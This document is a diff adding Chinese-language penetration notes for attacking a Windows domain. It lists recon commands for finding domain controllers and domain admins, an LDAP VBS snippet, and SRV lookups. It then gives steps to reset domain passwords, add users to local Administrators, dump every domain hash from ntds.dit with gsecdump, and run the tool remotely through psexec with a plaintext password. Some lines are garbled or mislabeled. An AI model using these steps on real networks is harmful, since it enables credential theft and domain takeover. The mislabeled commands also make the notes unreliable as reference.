@@ -1,0 +1,85 @@
+“活动目录策略--组策略--软件限制策略”
+NET和NET1都被限制了权限。
+
+nslookip 10.10.1.2
+
+开网关IP，看提示15级权限应该是CISCO
+
+传说gsecdump可以抓DC的HASH
+
+NET VIEW
+
+NET USER查看用户
+
+net view是可以看到本机所在的域约有多少台机器,net view /domain，可以看到有几个域，”net view /domain:域名“ 是看每个域中有多少台机器，net group "domain admins" /domain，是可以看到域管理员的名字，运气好的情况下是直接可以看到域服务器是哪一台
+
+net group "domain admins" /domain，在非英文英器上你可能要把domain admins这个名字来换一下了，就要先用net group来看看哪一个可能是域管理员的组。
+
+探测域服务器是哪一台还有另几个办法，除了dns的名字和net group "domain admins" /domain这个命令外，另一个办法是net time /domain，
+
+微软对域提供了专门的adsi（Active Directory）活动目录服务模型，其中在域用到的就是ADSI的接口之一LDAP提供者，用来管理域的。我们可以写一个很简短的vbs程序来探测出域服务器是哪一台，1.vbs代码如下：
+★
+set obj=GetObject("LDAP://rootDSE")
+wscript.echo obj.servername
+★
+
+
+
+
+
+域控的方法
+网上给出的办法：
+常用命令 net view
+查看同一域/工作组的计算机列表
+net view /domain
+查看域/工作组列表
+net view /domain:Secwing
+查看Secwing域中 计算机列表
+net group /domain
+查看所在域的组
+net user /domain
+查看所在域用户
+net user /domain zerosoul 12345678
+修改域用户密码，需要域管理员权限
+net localgroup administrators SECWING\zerosoul /add
+域Users组用户添加到本地Administrators组，需要本地管理员或域管理员在本机登陆域后进行
+下面的命令 只能用于 域控制器:
+net group “Domain controllers”
+查看域控制器(如果有多台)
+net group
+查看域的组
+net group “domain admins”
+查看域管理员
+net group “domain users”
+查看域管理员
+
+SRV 记录是一个域名系统 (DNS) 资源记录，用于标识承载特定服务的计算机。SRV 资源记录用于定位 Active Directory 的域控制器。要验证域控制器的 SRV 定位器资源记录，请使用下列方法之一。
+Nslookup
+Nslookup 是一个命令行工具，它显示的信息可以用来诊断域名系统 (DNS) 的基础结构。
+要使用 Nslookup 来验证 SRV 记录，请按照下列步骤操作：
+1.在 DNS 上，单击“开始”，然后单击“运行”。
+2.在“打开”框中，键入 cmd。
+3.键入 nslookup，然后按 Enter。
+4.键入 set type=srv，然后按 Enter。
+5.键入 _ldap._tcp.dc._msdcs.Domain_Name，其中
+Domain_Name
+为域名，然后按 Enter。
+
+slookup 将返回显示为以下格式的一个或多个 SRV 服务位置记录，其中，Server_Name
+为域控制器的主机名，Domain_Name
+为域控制器所属的域，Server_IP_Address
+为域控制器的 Internet 协议 (IP) 地址：
+Server:localhost
+Address:
+127.0.0.1
+_ldap._tcp.dc._msdcs.Domain_Name
+(输入如:_ldap._tcp.dc._msdcs.blackeagle.com)
+SRV service location:
+priority= 0
+weight= 100
+port= 389
+srv hostname= Server_Name.Domain_NameServer_Name.Domain_N
+⑴如何获得域成员服务器的权限，即可以访问域的共享权限？
+①通过gsecdump.exe
+gsecdump.exe能从域服务器密码存储文件windows\ntds\ntds.dit中导出所有域用户hash的工具，并能从活动进程中导出hash，如果占领的机器的管理破解出来的话，则就可以尝试用破获的用户名密码来截取域中成员机器的HASH值
+psexec \\192.168.168.x -u administrator –p test123!@# -c gsecdump.exe -u
